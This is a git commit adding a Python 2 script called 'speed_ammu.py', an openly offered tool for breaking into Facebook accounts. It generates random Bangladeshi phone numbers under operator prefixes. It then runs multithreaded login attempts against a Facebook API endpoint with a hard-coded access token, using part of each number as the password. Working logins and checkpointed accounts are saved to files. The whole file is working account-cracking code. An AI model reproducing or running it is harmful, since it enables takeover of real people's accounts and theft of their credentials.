b786986621dc48a1b812f819334e14e1b949843b
T A N Z U   .X.   SHI ZU KA <105282928+tanzu-M5R@users.noreply.github.com>
2022-05-21 18:51:55 +0600

    Add files via upload

---
+++ speed_ammu.py
@@ -0,0 +1,260 @@
+#-*-coding:utf-8-*-
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
+os.system('rm -rf .txt')
+
+def psb(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+
+os.system('clear')
+psb('\x1b[1;32mWELCOME DUDE -- BANGLADESH 11 DIGIT CLONING START PLEASE WAIT ...............')
+for n in range(11000):
+    nmbr = random.randint(1111111, 9999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+    time.sleep(1)
+    os.system('python2 C')
+
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+os.system('clear')
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [
+ ('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def exb():
+    print
+    os.sys.exit()
+
+
+def psb(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+
+	
+def t():
+    time.sleep(1)
+def cb():
+    os.system('clear')
+
+print ("""\033[1;92m __                     _                                          
+/ _\_ __   ___  ___  __| |   /\/\   __ _ _ __ ___  _ __ ___  _   _ 
+\ \| '_ \ / _ \/ _ \/ _` |  /    \ / _` | '_ ` _ \| '_ ` _ \| | | |
+_\ \ |_) |  __/  __/ (_| | / /\/\ \ (_| | | | | | | | | | | | |_| |
+\__/ .__/ \___|\___|\__,_| \/    \/\__,_|_| |_| |_|_| |_| |_|\__, |
+   |_|                                                       |___/ """)
+back = 0
+successful = []
+cpb = []
+oks = []
+id = []
+logo = """
+    ╔═══════════════════════════════════════╗\n    ║ TOOL NAME: { SPEED AMMU }             ║\n    ║ AUTHOR   : AAROHI ISLAM TANZU         ║\n    ║ GITHUB   : github.com/tanzu-M5R       ║\n    ║ CODED BY : TANZU & N00B B0SS          ║
+    ╚═══════════════════════════════════════╝     """
+def menu():
+    os.system('clear')
+    print logo
+   
+    print 50* '\033[1;32m_'
+    print '          \x1b[1;42m\033[1;31mBANGLADESH ALL OPERETOR NETWORK\033[00m\033[1;00m'
+    print '\x1b[1;96m[1]  GRAMEEN PHONE(First clone)'
+    print '\x1b[1;91m[2]  AIRTEL(5G-ST)'
+    print '\x1b[1;92m[3]  BANGLALINK(OLD)'
+    print '\x1b[1;93m[4]  BANGLALINK(NEW)'
+    print '\x1b[1;94m[5]  ROBI(5G-ST)'
+    print '\x1b[1;95m[6]  TELETALK(5G-ST)'
+    print '\x1b[1;91m[0]  EXIT'
+    print 50* '\033[1;32m_'
+    action()
+ 
+    
+    action()
+
+
+def action():
+    global cpb
+    global oks
+    bch = raw_input('\033[1;32mCHOICE AN OPTION : ')
+    if bch == '':
+        print
+        action()
+    elif bch == '1':
+        os.system('clear')
+        print logo
+        print 50* '\033[1;32m_'
+        
+        print '170,171, 172, 173, 174, 175, 176, 177, 178, 179,130'
+        print '131, 132, 133, 134, 135, 136, 137, 138, 139'
+        print 50* '\033[1;32m_'
+        try:
+            c = raw_input(' Choose Code  : ')
+            k = '+880'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '2':
+        os.system('clear')
+        print logo
+        print 50* '\033[1;32m_'
+        
+        print '180,181, 182, 183, 184, 185, 186, 187, 188, 189'
+        print 50* '\033[1;32m_'
+        try:
+            c = raw_input(' Choose Code  : ')
+            k = '+880'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '3':
+        os.system('clear')
+        print logo
+        print 50* '\033[1;32m_'
+        
+        print '160,161, 162, 163, 164, 165, 166, 167, 168, 169'
+        print 50* '\033[1;32m_'
+        try:
+            c = raw_input(' Choose Code  : ')
+            k = '+880'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '4':
+        os.system('clear')
+        print logo
+        print 50* '\033[1;32m_'
+        
+        print '190,191, 192, 193, 194, 195, 196, 197, 198, 199,140'
+        print '141, 142, 143, 144, 145, 146, 147, 148, 149'
+        print 50* '\033[1;32m_'
+        try:
+            c = raw_input(' Choose Code  : ')
+            k = '+880'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '5':
+        os.system('clear')
+        print logo
+        print 50* '\033[1;32m_'
+        
+        print '150,151, 152, 153, 154, 155, 156, 157, 158, 159'
+        print 50* '\033[1;32m_'
+        try:
+            c = raw_input(' Choose Code  : ')
+            k = '+880'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '0':
+        exb()
+    else:
+        print
+        action()
+    xxx = str(len(id))
+    
+    print 50* '\033[1;32m_'
+    psb('[\xe2\x9c\x93] Total Numbers: ' + xxx)
+    time.sleep(0.5)
+    psb('[\xe2\x9c\x93] Please wait, process is running ...')
+    time.sleep(0.5)
+    psb('[!] To Stop Process Press CTRL Then Press z')
+    time.sleep(0.5)
+    psb(50* '\033[1;32m_')
+    time.sleep(0.5)
+ 
+ 
+
+    def main(arg):
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+
+        try:
+            result = k + c + user
+            digi11 = result[3:14]
+            pass1 = digi11
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[TANZU_OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '|' + pass1 + '\n')
+                okb.close()
+                oks.append(c + user + pass1)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;96m[TANZU_CP]\x1b[1;92m ' + k + c + user + ' | ' + pass1 + ' \x1b[1;96m [After 7 Days]\x1b[0m \n'
+                cps = open('save/checkpoint.txt', 'a')
+                cps.write(k + c + user + '|' + pass1 + '\n')
+                cps.close()
+                cpb.append(c + user + pass1)
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print
+    50 * '-'
+    print
+    print
+    '[\xe2\x9c\x93] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
+    print '[\xe2\x9c\x93] CP File Has Been Saved : save/checkpoint.txt'
+    raw_input('\n[Press Enter To Go Back]')
+    os.system('python2 jahied.py')
+
+
+if __name__ == '__main__':
+    menu()
